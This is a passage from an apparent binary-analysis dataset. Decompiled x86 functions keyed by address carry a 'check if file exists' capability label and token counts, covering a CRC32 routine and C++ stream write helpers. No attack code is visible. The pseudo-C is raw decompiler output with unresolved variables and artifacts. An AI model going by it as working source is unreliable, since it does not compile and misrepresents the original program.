   uVar8 = 10;\n        fcn.004011fe();\n        fcn.0040119a();\n        fcn.0040117c(0x442798, 0x4230c8, uVar8, uVar16, noname_2, noname_2_00, noname_2_01, noname_2_02, noname_2_03, \n                     uVar12, noname_2_04, uVar13, uVar14);\n        uVar9 = 10;\n        fcn.004011fe();\n        fcn.0040119a();\n        fcn.0040117c(0x442798, 0x4230c8, uVar9, uVar8, uVar16, noname_2, noname_2_00, noname_2_01, noname_2_02, \n                     noname_2_03, uVar12, noname_2_04, uVar13);\n        uVar10 = 10;\n        fcn.004011fe();\n        fcn.0040119a();\n        fcn.0040117c(0x442798, 0x4230c8, uVar10, uVar9, uVar8, uVar16, noname_2, noname_2_00, noname_2_01, noname_2_02, \n                     noname_2_03, uVar12, noname_2_04);\n        uVar11 = 10;\n        fcn.004011fe();\n        fcn.0040119a();\n        fcn.0040117c(0x442798, 0x4230c8, uVar11, uVar10, uVar9, uVar8, uVar16, noname_2, noname_2_00, noname_2_01, \n                     noname_2_02, noname_2_03, uVar12);\n        uVar12 = 10;\n        fcn.004011fe();\n        fcn.0040119a();\n        fcn.0040117c(0x442798, 0x4230c8, uVar12, uVar11, uVar10, uVar9, uVar8, uVar16, noname_2, noname_2_00, \n                     noname_2_01, noname_2_02, noname_2_03);\n        uVar6 = 10;\n        fcn.004011fe();\n        fcn.0040119a();\n        fcn.0040117c(0x442798, 0x4230c8, uVar6, uVar12, uVar11, uVar10, uVar9, uVar8, uVar16, noname_2, noname_2_00, \n                     noname_2_01, noname_2_02);\n        uVar13 = 10;\n        fcn.004011fe();\n        fcn.0040119a();\n        fcn.0040117c(0x442798, 0x4230c8, uVar13, uVar6, uVar12, uVar11, uVar10, uVar9, uVar8, uVar16, noname_2, \n                     noname_2_00, noname_2_01);\n        uVar7 = 10;\n        fcn.004011fe();\n        fcn.0040119a();\n        fcn.0040117c(0x442798, 0x4230c8, uVar7, uVar13, uVar6, uVar12, uVar11, uVar10, uVar9, uVar8, uVar16, noname_2, \n                     noname_2_00);\n        uVar14 = 10;\n        fcn.004011fe();\n        fcn.0040119a();\n        fcn.0040117c(0x442798, 0x4230c8, uVar14, uVar7, uVar13, uVar6, uVar12, uVar11, uVar10, uVar9, uVar8, uVar16, \n                     noname_2);\n        uVar15 = 10;\n        fcn.004011fe();\n        fcn.0040119a();\n        fcn.0040117c(0x442798, 0x4230c8, uVar15, uVar14, uVar7, uVar13, uVar6, uVar12, uVar11, uVar10, uVar9, uVar8, \n                     uVar16);\n        uVar16 = 10;\n        fcn.004011fe();\n        fcn.0040119a();\n        uVar4 = uVar5 ^ uVar1;\n        fcn.0040117c(0x442798, 0x4230c8, uVar16, uVar15, uVar14, uVar7, uVar13, uVar6, uVar12, uVar11, uVar10, uVar9, \n                     uVar8);\n        uVar8 = 10;\n        fcn.004011fe();\n        fcn.0040119a();\n        fcn.0040117c(0x442798, 0x4230c8, uVar8, uVar16, uVar15, uVar14, uVar7, uVar13, uVar6, uVar12, uVar11, uVar10, \n                     uVar9);\n        uVar9 = 10;\n        fcn.004011fe();\n        fcn.0040119a();\n        fcn.0040117c(0x442798, 0x4230c8, uVar9, uVar8, uVar16, uVar15, uVar14, uVar7, uVar13, uVar6, uVar12, uVar11, \n                     uVar10);\n        uVar10 = 10;\n        fcn.004011fe();\n        fcn.0040119a();\n        fcn.0040117c(0x442798, 0x4230c8, uVar10, uVar9, uVar8, uVar16, uVar15, uVar14, uVar7, uVar13, uVar6, uVar12, \n                     uVar11);\n        uVar11 = 10;\n        fcn.004011fe();\n        fcn.0040119a();\n        fcn.0040117c(0x442798, 0x4230c8, uVar11, uVar10, uVar9, uVar8, uVar16, uVar15, uVar14, uVar7, uVar13, uVar6, \n                     uVar12);\n        uVar12 = 10;\n        fcn.004011fe();\n        fcn.0040119a();\n        fcn.0040117c(0x442798, 0x4230c8, uVar12, uVar11, uVar10, uVar9, uVar8, uVar16, uVar15, uVar14, uVar7, uVar13, \n                     uVar6);\n        uVar6 = 10;\n        fcn.004011fe();\n        fcn.0040119a();\n        fcn.0040117c(0x442798, 0x4230c8, uVar6, uVar12, uVar11, uVar10, uVar9, uVar8, uVar16, uVar15, uVar14, uVar7, \n                     uVar13);\n        uVar13 = 10;\n        fcn.004011fe();\n        fcn.0040119a();\n        fcn.0040117c(0x442798, 0x4230c8, uVar13, uVar6, uVar12, uVar11, uVar10, uVar9, uVar8, uVar16, uVar15, uVar14, \n                     uVar7);\n        uVar7 = 10;\n        fcn.004011fe();\n        fcn.0040119a();\n        fcn.0040117c(0x442798, 0x4230c8, uVar7, uVar13, uVar6, uVar12, uVar11, uVar10, uVar9, uVar8, uVar16, uVar15, \n                     uVar14);\n        uVar14 = 10;\n        fcn.004011fe();\n        fcn.0040119a();\n        fcn.0040117c(0x442798, 0x4230c8, uVar14, uVar7, uVar13, uVar6, uVar12, uVar11, uVar10, uVar9, uVar8, uVar16, \n                     uVar15);\n        uVar15 = 10;\n        fcn.004011fe();\n        fcn.0040119a();\n        fcn.0040117c(0x442798, 0x4230c8, uVar15, uVar14, uVar7, uVar13, uVar6, uVar12, uVar11, uVar10, uVar9, uVar8, \n                     uVar16);\n        uVar16 = 10;\n        fcn.004011fe();\n        fcn.0040119a();\n        fcn.0040117c(0x442798, 0x4230c8, uVar16, uVar15, uVar14, uVar7, uVar13, uVar6, uVar12, uVar11, uVar10, uVar9, \n                     uVar8);\n        uVar8 = 10;\n        fcn.004011fe();\n        fcn.0040119a();\n        fcn.0040117c(0x442798, 0x4230c8, uVar8, uVar16, uVar15, uVar14, uVar7, uVar13, uVar6, uVar12, uVar11, uVar10, \n                     uVar9);\n        uVar9 = 10;\n        fcn.004011fe();\n        fcn.0040119a();\n        fcn.0040117c(0x442798, 0x4230c8, uVar9, uVar8, uVar16, uVar15, uVar14, uVar7, uVar13, uVar6, uVar12, uVar11, \n                     uVar10);\n        uVar10 = 10;\n        fcn.004011fe();\n        fcn.0040119a();\n        fcn.0040117c(0x442798, 0x4230c8, uVar10, uVar9, uVar8, uVar16, uVar15, uVar14, uVar7, uVar13, uVar6, uVar12, \n                     uVar11);\n        uVar11 = 10;\n        fcn.004011fe();\n        fcn.0040119a();\n        fcn.0040117c(0x442798, 0x4230c8, uVar11, uVar10, uVar9, uVar8, uVar16, uVar15, uVar14, uVar7, uVar13, uVar6, \n                     uVar12);\n        uVar12 = 10;\n        fcn.004011fe();\n        fcn.0040119a();\n        fcn.0040117c(0x442798, 0x4230c8, uVar12, uVar11, uVar10, uVar9, uVar8, uVar16, uVar15, uVar14, uVar7, uVar13, \n                     uVar6);\n        uVar6 = 10;\n        fcn.004011fe();\n        fcn.0040119a();\n        fcn.0040117c(0x442798, 0x4230c8, uVar6, uVar12, uVar11, uVar10, uVar9, uVar8, uVar16, uVar15, uVar14, uVar7, \n                     uVar13);\n        uVar13 = 10;\n        fcn.004011fe();\n        fcn.0040119a();\n        fcn.0040117c(0x442798, 0x4230c8, uVar13, uVar6, uVar12, uVar11, uVar10, uVar9, uVar8, uVar16, uVar15, uVar14, \n                     uVar7);\n        uVar7 = 10;\n        fcn.004011fe();\n        fcn.0040119a();\n        fcn.0040117c(0x442798, 0x4230c8, uVar7, uVar13, uVar6, uVar12, uVar11, uVar10, uVar9, uVar8, uVar16, uVar15, \n                     uVar14);\n        uVar14 = 10;\n        fcn.004011fe();\n        fcn.0040119a();\n        fcn.0040117c(0x442798, 0x4230c8, uVar14, uVar7, uVar13, uVar6, uVar12, uVar11, uVar10, uVar9, uVar8, uVar16, \n                     uVar15);\n        uVar15 = 10;\n        fcn.004011fe();\n        fcn.0040119a();\n        fcn.0040117c(0x442798, 0x4230c8, uVar15, uVar14, uVar7, uVar13, uVar6, uVar12, uVar11, uVar10, uVar9, uVar8, \n                     uVar16);\n        uVar16 = 10;\n        fcn.004011fe();\n        fcn.0040119a();\n        fcn.0040117c(0x442798, 0x4230c8, uVar16, uVar15, uVar14, uVar7, uVar13, uVar6, uVar12, uVar11, uVar10, uVar9, \n                     uVar8);\n        uVar8 = 10;\n        fcn.004011fe();\n        fcn.0040119a();\n        fcn.0040117c(0x442798, 0x4230c8, uVar8, uVar16, uVar15, uVar14, uVar7, uVar13, uVar6, uVar12, uVar11, uVar10, \n                     uVar9);\n        uVar9 = 10;\n        fcn.004011fe();\n        fcn.0040119a();\n        fcn.0040117c(0x442798, 0x4230c8, uVar9, uVar8, uVar16, uVar15, uVar14, uVar7, uVar13, uVar6, uVar12, uVar11, \n                     uVar10);\n        uVar10 = 10;\n        fcn.004011fe();\n        fcn.0040119a();\n        fcn.0040117c(0x442798, 0x4230c8, uVar10, uVar9, uVar8, uVar16, uVar15, uVar14, uVar7, uVar13, uVar6, uVar12, \n                     uVar11);\n        uVar11 = 10;\n        fcn.004011fe();\n        fcn.0040119a();\n        fcn.0040117c(0x442798, 0x4230c8, uVar11, uVar10, uVar9, uVar8, uVar16, uVar15, uVar14, uVar7, uVar13, uVar6, \n                     uVar12);\n        uVar12 = 10;\n        fcn.004011fe();\n        fcn.0040119a();\n        fcn.0040117c(0x442798, 0x4230c8, uVar12, uVar11, uVar10, uVar9, uVar8, uVar16, uVar15, uVar14, uVar7, uVar13, \n                     uVar6);\n        uVar6 = 10;\n        fcn.004011fe();\n        fcn.0040119a();\n        fcn.0040117c(0x442798, 0x4230c8, uVar6, uVar12, uVar11, uVar10, uVar9, uVar8, uVar16, uVar15, uVar14, uVar7, \n                     uVar13);\n        uVar13 = 10;\n        fcn.004011fe();\n        fcn.0040119a();\n        fcn.0040117c(0x442798, 0x4230c8, uVar13, uVar6, uVar12, uVar11, uVar10, uVar9, uVar8, uVar16, uVar15, uVar14, \n                     uVar7);\n        uVar7 = 10;\n        fcn.004011fe();\n        fcn.0040119a();\n        fcn.0040117c(0x442798, 0x4230c8, uVar7, uVar13, uVar6, uVar12, uVar11, uVar10, uVar9, uVar8, uVar16, uVar15, \n                     uVar14);\n        uVar14 = 10;\n        fcn.004011fe();\n        fcn.0040119a();\n        fcn.0040117c(0x442798, 0x4230c8, uVar14, uVar7, uVar13, uVar6, uVar12, uVar11, uVar10, uVar9, uVar8, uVar16, \n                     uVar15);\n        uVar15 = 10;\n        fcn.004011fe();\n        fcn.0040119a();\n        fcn.0040117c(0x442798, 0x4230c8, uVar15, uVar14, uVar7, uVar13, uVar6, uVar12, uVar11, uVar10, uVar9, uVar8, \n                     uVar16);\n        uVar16 = 10;\n        fcn.004011fe();\n        fcn.0040119a();\n        fcn.0040117c(0x442798, 0x4230c8, uVar16, uVar15, uVar14, uVar7, uVar13, uVar6, uVar12, uVar11, uVar10, uVar9, \n                     uVar8);\n        uVar8 = 10;\n        fcn.004011fe();\n        fcn.0040119a();\n        fcn.0040117c(0x442798, 0x4230c8, uVar8, uVar16, uVar15, uVar14, uVar7, uVar13, uVar6, uVar12, uVar11, uVar10, \n                     uVar9);\n        uVar9 = 10;\n        fcn.004011fe();\n        fcn.0040119a();\n        fcn.0040117c(0x442798, 0x4230c8, uVar9, uVar8, uVar16, uVar15, uVar14, uVar7, uVar13, uVar6, uVar12, uVar11, \n                     uVar10);\n        uVar10 = 10;\n        fcn.004011fe();\n        fcn.0040119a();\n        fcn.0040117c(0x442798, 0x4230c8, uVar10, uVar9, uVar8, uVar16, uVar15, uVar14, uVar7, uVar13, uVar6, uVar12, \n                     uVar11);\n        uVar11 = 10;\n        fcn.004011fe();\n        fcn.0040119a();\n        fcn.0040117c(0x442798, 0x4230c8, uVar11, uVar10, uVar9, uVar8, uVar16, uVar15, uVar14, uVar7, uVar13, uVar6, \n                     uVar12);\n        uVar12 = 10;\n        fcn.004011fe();\n        fcn.0040119a();\n        fcn.0040117c(0x442798, 0x4230c8, uVar12, uVar11, uVar10, uVar9, uVar8, uVar16, uVar15, uVar14, uVar7, uVar13, \n                     uVar6);\n        uVar6 = 10;\n        fcn.004011fe();\n        fcn.0040119a();\n        fcn.0040117c(0x442798, 0x4230c8, uVar6, uVar12, uVar11, uVar10, uVar9, uVar8, uVar16, uVar15, uVar14, uVar7, \n                     uVar13);\n        uVar13 = 10;\n        fcn.004011fe();\n        fcn.0040119a();\n        fcn.0040117c(0x442798, 0x4230c8, uVar13, uVar6, uVar12, uVar11, uVar10, uVar9, uVar8, uVar16, uVar15, uVar14, \n                     uVar7);\n        uVar7 = 10;\n        fcn.004011fe();\n        fcn.0040119a();\n        fcn.0040117c(0x442798, 0x4230c8, uVar7, uVar13, uVar6, uVar12, uVar11, uVar10, uVar9, uVar8, uVar16, uVar15, \n                     uVar14);\n        uVar14 = 10;\n        fcn.004011fe();\n        fcn.0040119a();\n        fcn.0040117c(0x442798, 0x4230c8, uVar14, uVar7, uVar13, uVar6, uVar12, uVar11, uVar10, uVar9, uVar8, uVar16, \n                     uVar15);\n        uVar15 = 10;\n        fcn.004011fe();\n        fcn.0040119a();\n        fcn.0040117c(0x442798, 0x4230c8, uVar15, uVar14, uVar7, uVar13, uVar6, uVar12, uVar11, uVar10, uVar9, uVar8, \n                     uVar16);\n        uVar16 = 10;\n        fcn.004011fe();\n        fcn.0040119a();\n        fcn.0040117c(0x442798, 0x4230c8, uVar16, uVar15, uVar14, uVar7, uVar13, uVar6, uVar12, uVar11, uVar10, uVar9, \n                     uVar8);\n        uVar8 = 10;\n        fcn.004011fe();\n        fcn.0040119a();\n        fcn.0040117c(0x442798, 0x4230c8, uVar8, uVar16, uVar15, uVar14, uVar7, uVar13, uVar6, uVar12, uVar11, uVar10, \n                     uVar9);\n        uVar9 = 10;\n        fcn.004011fe();\n        fcn.0040119a();\n        fcn.0040117c(0x442798, 0x4230c8, uVar9, uVar8, uVar16, uVar15, uVar14, uVar7, uVar13, uVar6, uVar12, uVar11, \n                     uVar10);\n        uVar10 = 10;\n        fcn.004011fe();\n        fcn.0040119a();\n        fcn.0040117c(0x442798, 0x4230c8, uVar10, uVar9, uVar8, uVar16, uVar15, uVar14, uVar7, uVar13, uVar6, uVar12, \n                     uVar11);\n        uVar11 = 10;\n        fcn.004011fe();\n        fcn.0040119a();\n        fcn.0040117c(0x442798, 0x4230c8, uVar11, uVar10, uVar9, uVar8, uVar16, uVar15, uVar14, uVar7, uVar13, uVar6, \n                     uVar12);\n        uVar12 = 10;\n        fcn.004011fe();\n        fcn.0040119a();\n        fcn.0040117c(0x442798, 0x4230c8, uVar12, uVar11, uVar10, uVar9, uVar8, uVar16, uVar15, uVar14, uVar7, uVar13, \n                     uVar6);\n        noname_4 = 10;\n        fcn.004011fe();\n        fcn.0040119a();\n        fcn.0040117c(0x442798, 0x4230c8, noname_4, uVar12, uVar11, uVar10, uVar9, uVar8, uVar16, uVar15, uVar14, uVar7, \n                     uVar13);\n        uVar13 = 10;\n        fcn.004011fe();\n        fcn.0040119a();\n        fcn.0040117c(0x442798, 0x4230c8, uVar13, noname_4, uVar12, uVar11, uVar10, uVar9, uVar8, uVar16, uVar15, uVar14\n                     , uVar7);\n        iVar3 = 10;\n        fcn.004011fe();\n        fcn.0040119a();\n        fcn.0040117c(0x442798, 0x4230c8, iVar3, uVar13, noname_4, uVar12, uVar11, uVar10, uVar9, uVar8, uVar16, uVar15, \n                     uVar14);\n        uVar14 = 10;\n        fcn.004011fe();\n        fcn.0040119a();\n        fcn.0040117c(0x442798, 0x4230c8, uVar14, iVar3, uVar13, noname_4, uVar12, uVar11, uVar10, uVar9, uVar8, uVar16, \n                     uVar15);\n        uVar15 = 10;\n        fcn.004011fe();\n        fcn.0040119a();\n        fcn.0040117c(0x442798, 0x4230c8, uVar15, uVar14, iVar3, uVar13, noname_4, uVar12, uVar11, uVar10, uVar9, uVar8, \n                     uVar16);\n        uVar16 = 10;\n        fcn.004011fe();\n        fcn.0040119a();\n        fcn.0040117c(0x442798, 0x4230c8, uVar16, uVar15, uVar14, iVar3, uVar13, noname_4, uVar12, uVar11, uVar10, uVar9\n                     , uVar8);\n        unaff_EDI = 10;\n        fcn.004011fe();\n        fcn.0040119a();\n        uVar5 = (uVar4 << 0x1e) >> 0x1f & 0xee0e612cU ^\n                (uVar4 << 0x1f) >> 0x1f & 0x77073096U ^ (uVar4 << 0x1d) >> 0x1f & 0x76dc419U ^\n                (uVar4 << 0x19) >> 0x1f & 0x76dc4190U ^ (uVar4 << 0x1a) >> 0x1f & 0x3b6e20c8U ^\n                (uVar4 << 0x1b) >> 0x1f & 0x1db71064U ^ (uVar4 << 0x1c) >> 0x1f & 0xedb8832U ^ uVar5 >> 8 ^\n                (uVar4 << 0x18) >> 0x1f & 0xedb88320U;\n        uVar1 = *(iVar3 + 1 + noname_4);\n    }\n    return ~uVar5;\n}\n",
        "token_count": 17880
    },
    "0040117c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __cdecl\nfcn.0040117c(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint arg_ch)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    int32_t *piVar3;\n    uint8_t *puVar4;\n    char *pcVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    uint *in_FS_OFFSET;\n    int32_t *var_8h;\n    char *var_ch;\n    uint var_10h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_ch_2;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x41f6f8;\n    var_ch_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch_2;\n    iVar9 = 0;\n    var_14h = 0;\n    pcVar5 = var_ch;\n    do {\n        cVar1 = *pcVar5;\n        pcVar5 = pcVar5 + 1;\n    } while (cVar1 != '\\0');\n    iVar6 = pcVar5 - (var_ch + 1);\n    iVar8 = *(*(*var_8h + 4) + 0x18 + var_8h);\n    if ((0 < iVar8) && (iVar6 < iVar8)) {\n        iVar9 = iVar8 - iVar6;\n    }\n    fcn.0040126c(var_8h);\n    if (var_1ch == '\\0') {\n        var_14h = 4;\n        goto code_r0x0040277e;\n    }\n    var_4h = 1;\n    if ((*(*(*var_8h + 4) + 0x10 + var_8h) & 0x1c0) == 0x40) {\ncode_r0x004026ad:\n        iVar8 = (**(**(*(*var_8h + 4) + 0x28 + var_8h) + 0x1c))(var_ch, iVar6);\n        if (iVar8 == iVar6) {\n            for (; 0 < iVar9; iVar9 = iVar9 + -1) {\n                uVar2 = *(*(*var_8h + 4) + 0x30 + var_8h);\n                piVar3 = *(var_8h + *(*var_8h + 4) + 0x28);\n                if ((*piVar3[9] == 0) || (uVar7 = *piVar3[9],  *piVar3[0xd] + uVar7 <= uVar7)) {\n                    uVar7 = (**(*piVar3 + 4))(uVar2);\n                }\n                else {\n                    *piVar3[0xd] = *piVar3[0xd] + -1;\n                    puVar4 = *piVar3[9];\n                    *piVar3[9] = puVar4 + 1;\n                    *puVar4 = uVar2;\n                    uVar7 = uVar2;\n                }\n                if (uVar7 == 0xffffffff) {\n                    var_14h = 4;\n                    *(var_8h + *(*var_8h + 4) + 0x18) = 0;\n                    goto code_r0x0040277e;\n                }\n            }\n        }\n        else {\n            var_14h = 4;\n        }\n    }\n    else {\n        for (; 0 < iVar9; iVar9 = iVar9 + -1) {\n            uVar2 = *(*(*var_8h + 4) + 0x30 + var_8h);\n            piVar3 = *(var_8h + *(*var_8h + 4) + 0x28);\n            if ((*piVar3[9] == 0) || (uVar7 = *piVar3[9],  *piVar3[0xd] + uVar7 <= uVar7)) {\n                uVar7 = (**(*piVar3 + 4))(uVar2);\n            }\n            else {\n                *piVar3[0xd] = *piVar3[0xd] + -1;\n                puVar4 = *piVar3[9];\n                *piVar3[9] = puVar4 + 1;\n                *puVar4 = uVar2;\n                uVar7 = uVar2;\n            }\n            if (uVar7 == 0xffffffff) {\n                var_14h = 4;\n                break;\n            }\n        }\n        if (var_14h == 0) goto code_r0x004026ad;\n    }\n    *(var_8h + *(*var_8h + 4) + 0x18) = 0;\ncode_r0x0040277e:\n    var_4h = 0;\n    if (var_14h != 0) {\n        var_14h = *(var_8h + *(*var_8h + 4) + 8) | var_14h;\n        if (*(var_8h + *(*var_8h + 4) + 0x28) == 0) {\n            var_14h = var_14h | 4;\n        }\n        fcn.0040888d(var_14h, 0);\n    }\n    var_4h = 0xffffffff;\n    fcn.0040115e();\n    *in_FS_OFFSET = var_ch_2;\n    return var_8h;\n}\n",
        "token_count": 1321
    },
    "0040119a": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.0040119a(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    if ((*(param_1 + *(*param_1 + 4) + 8) & 6) == 0) {\n        iVar1 = (**(**(param_1 + *(*param_1 + 4) + 0x28) + 0x2c))();\n        if (iVar1 == -1) {\n            uVar2 = 4;\n        }\n    }\n    if (uVar2 != 0) {\n        uVar2 = *(param_1 + *(*param_1 + 4) + 8) | uVar2;\n        if (*(param_1 + *(*param_1 + 4) + 0x28) == 0) {\n            uVar2 = uVar2 | 4;\n        }\n        fcn.0040888d(uVar2, 0);\n    }\n    return param_1;\n}\n",
        "token_count": 233
    },
    "004011fe": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __thiscall fcn.004011fe(int32_t *param_1, uint8_t param_2)\n\n{\n    int32_t *piVar1;\n    uint8_t *puVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint *in_FS_OFFSET;\n    uint var_8h;\n    uint var_10h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x41f718;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    uVar4 = 0;\n    fcn.0040126c(param_1);\n    if (var_1ch == '\\0') {\n        uVar4 = 4;\n    }\n    else {\n        piVar1 = *(*(*param_1 + 4) + 0x28 + param_1);\n        var_4h = 1;\n        if ((*piVar1[9] == 0) || (uVar3 = *piVar1[9],  *piVar1[0xd] + uVar3 <= uVar3)) {\n            uVar3 = (**(*piVar1 + 4))(var_8h);\n        }\n        else {\n            *piVar1[0xd] = *piVar1[0xd] + -1;\n            puVar2 = *piVar1[9];\n            *piVar1[9] = puVar2 + 1;\n            *puVar2 = var_8h;\n            uVar3 = var_8h;\n        }\n        if (uVar3 == 0xffffffff) {\n            uVar4 = 4;\n        }\n    }\n    var_4h = 0;\n    if (uVar4 != 0) {\n        uVar4 = *(param_1 + *(*param_1 + 4) + 8) | uVar4;\n        if (*(param_1 + *(*param_1 + 4) + 0x28) == 0) {\n            uVar4 = uVar4 | 4;\n        }\n        fcn.0040888d(uVar4, 0);\n    }\n    var_4h = 0xffffffff;\n    fcn.0040115e();\n    *in_FS_OFFSET = var_ch;\n    return param_1;\n}\n",
        "token_count": 566
    },
    "00401262": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.00401262(int32_t param_1, int32_t param_2, uint32_t param_3, uint param_4, uint param_5, uint param_6)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint32_t uVar3;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint32_t uVar4;\n    uint unaff_retaddr;\n    uint noname_2;\n    uint noname_2_00;\n    uint noname_2_01;\n    uint noname_2_02;\n    uint noname_2_03;\n    uint noname_2_04;\n    uint noname_2_05;\n    uint noname_2_06;\n    uint noname_2_07;\n    uint noname_2_08;\n    \n    uVar3 = 0;\n    if (param_3 != 0) {\n        do {\n            piVar1 = fcn.0040117c(0x442798, 0x4230c8, unaff_EDI, unaff_ESI, unaff_EBX, unaff_EBP, unaff_retaddr, param_1\n                                  , param_2, param_3, param_4, param_5, param_6);\n            noname_2_08 = 10;\n            fcn.004011fe();\n            uVar4 = 0;\n            if (((*(piVar1 + *(*piVar1 + 4) + 8) & 6) == 0) &&\n               (iVar2 = (**(**(piVar1 + *(*piVar1 + 4) + 0x28) + 0x2c))(),  iVar2 == -1)) {\n                uVar4 = 4;\n            }\n            if (uVar4 != 0) {\n                uVar4 = *(piVar1 + *(*piVar1 + 4) + 8) | uVar4;\n                if (*(piVar1 + *(*piVar1 + 4) + 0x28) == 0) {\n                    uVar4 = uVar4 | 4;\n                }\n                fcn.0040888d(uVar4, 0);\n            }\n            piVar1 = fcn.0040117c(0x442798, 0x4230c8, noname_2_08, unaff_EDI, unaff_ESI, unaff_EBX, unaff_EBP, \n                                  unaff_retaddr, param_1, param_2, param_3, param_4, param_5);\n            noname_2_07 = 10;\n            fcn.004011fe();\n            uVar4 = 0;\n            if (((*(*(*piVar1 + 4) + 8 + piVar1) & 6) == 0) &&\n               (iVar2 = (**(**(piVar1 + *(*piVar1 + 4) + 0x28) + 0x2c))(),  iVar2 == -1)) {\n                uVar4 = 4;\n            }\n            if (uVar4 != 0) {\n                uVar4 = *(piVar1 + *(*piVar1 + 4) + 8) | uVar4;\n                if (*(piVar1 + *(*piVar1 + 4) + 0x28) == 0) {\n                    uVar4 = uVar4 | 4;\n                }\n                fcn.0040888d(uVar4, 0);\n            }\n            piVar1 = fcn.0040117c(0x442798, 0x4230c8, noname_2_07, noname_2_08, unaff_EDI, unaff_ESI, unaff_EBX, \n                                  unaff_EBP, unaff_retaddr, param_1, param_2, param_3, param_4);\n            noname_2_06 = 10;\n            fcn.004011fe();\n            uVar4 = 0;\n            if (((*(*(*piVar1 + 4) + 8 + piVar1) & 6) == 0) &&\n               (iVar2 = (**(**(piVar1 + *(*piVar1 + 4) + 0x28) + 0x2c))(),  iVar2 == -1)) {\n                uVar4 = 4;\n            }\n            if (uVar4 != 0) {\n                uVar4 = *(piVar1 + *(*piVar1 + 4) + 8) | uVar4;\n                if (*(piVar1 + *(*piVar1 + 4) + 0x28) == 0) {\n                    uVar4 = uVar4 | 4;\n                }\n                fcn.0040888d(uVar4, 0);\n            }\n            piVar1 = fcn.0040117c(0x442798, 0x4230c8, noname_2_06, noname_2_07, noname_2_08, unaff_EDI, unaff_ESI, \n                                  unaff_EBX, unaff_EBP, unaff_retaddr, param_1, param_2, param_3);\n            noname_2_05 = 10;\n            fcn.004011fe();\n            uVar4 = 0;\n            if (((*(*(*piVar1 + 4) + 8 + piVar1) & 6) == 0) &&\n               (iVar2 = (**(**(piVar1 + *(*piVar1 + 4) + 0x28) + 0x2c))(),  iVar2 == -1)) {\n                uVar4 = 4;\n            }\n            if (uVar4 != 0) {\n                uVar4 = *(piVar1 + *(*piVar1 + 4) + 8) | uVar4;\n                if (*(piVar1 + *(*piVar1 + 4) + 0x28) == 0) {\n                    uVar4 = uVar4 | 4;\n                }\n                fcn.0040888d(uVar4, 0);\n            }\n            piVar1 = fcn.0040117c(0x442798, 0x4230c8, noname_2_05, noname_2_06, noname_2_07, noname_2_08, unaff_EDI, \n                                  unaff_ESI, unaff_EBX, unaff_EBP, unaff_retaddr, param_1, param_2);\n            noname_2_04 = 10;\n            fcn.004011fe();\n            uVar4 = 0;\n            if (((*(*(*piVar1 + 4) + 8 + piVar1) & 6) == 0) &&\n               (iVar2 = (**(**(piVar1 + *(*piVar1 + 4) + 0x28) + 0x2c))(),  iVar2 == -1)) {\n                uVar4 = 4;\n            }\n            if (uVar4 != 0) {\n                uVar4 = *(piVar1 + *(*piVar1 + 4) + 8) | uVar4;\n                if (*(piVar1 + *(*piVar1 + 4) + 0x28) == 0) {\n                    uVar4 = uVar4 | 4;\n                }\n                fcn.0040888d(uVar4, 0);\n            }\n            piVar1 = fcn.0040117c(0x442798, 0x4230c8, noname_2_04, noname_2_05, noname_2_06, noname_2_07, noname_2_08, \n                                  unaff_EDI, unaff_ESI, unaff_EBX, unaff_EBP, unaff_retaddr, param_1);\n            noname_2_03 = 10;\n            fcn.004011fe();\n            uVar4 = 0;\n            if (((*(*(*piVar1 + 4) + 8 + piVar1) & 6) == 0) &&\n               (iVar2 = (**(**(piVar1 + *(*piVar1 + 4) + 0x28) + 0x2c))(),  iVar2 == -1)) {\n                uVar4 = 4;\n            }\n            if (uVar4 != 0) {\n                uVar4 = *(piVar1 + *(*piVar1 + 4) + 8) | uVar4;\n                if (*(piVar1 + *(*piVar1 + 4) + 0x28) == 0) {\n                    uVar4 = uVar4 | 4;\n                }\n                fcn.0040888d(uVar4, 0);\n            }\n            piVar1 = fcn.0040117c(0x442798, 0x4230c8, noname_2_03, noname_2_04, noname_2_05, noname_2_06, noname_2_07, \n                                  noname_2_08, unaff_EDI, unaff_ESI, unaff_EBX, unaff_EBP, unaff_retaddr);\n            noname_2_02 = 10;\n            fcn.004011fe();\n            uVar4 = 0;\n            if (((*(*(*piVar1 + 4) + 8 + piVar1) & 6) == 0) &&\n               (iVar2 = (**(**(piVar1 + *(*piVar1 + 4) + 0x28) + 0x2c))(),  iVar2 == -1)) {\n                uVar4 = 4;\n            }\n            if (uVar4 != 0) {\n                uVar4 = *(piVar1 + *(*piVar1 + 4) + 8) | uVar4;\n                if (*(piVar1 + *(*piVar1 + 4) + 0x28) == 0) {\n                    uVar4 = uVar4 | 4;\n                }\n                fcn.0040888d(uVar4, 0);\n            